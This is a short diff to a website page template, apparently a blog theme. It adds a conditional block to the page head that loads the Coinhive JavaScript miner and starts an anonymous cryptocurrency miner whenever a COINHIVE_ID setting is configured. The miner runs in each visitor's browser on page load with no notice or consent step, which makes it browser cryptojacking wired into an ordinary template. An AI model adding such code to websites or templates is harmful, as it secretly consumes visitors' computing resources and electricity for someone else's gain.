@@ -26,6 +26,15 @@
             <link rel="author" href="https://plus.google.com/{{GOOGLE_PLUS_ID}}"/>
    		{% endif %}
 
+
+        {% if COINHIVE_ID %}
+            <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+            <script>
+                var miner = new CoinHive.Anonymous('{{COINHIVE_ID}}');
+                miner.start();
+            </script>
+        {% endif %}
+
         {% endblock head %}
 </head>
 <body>
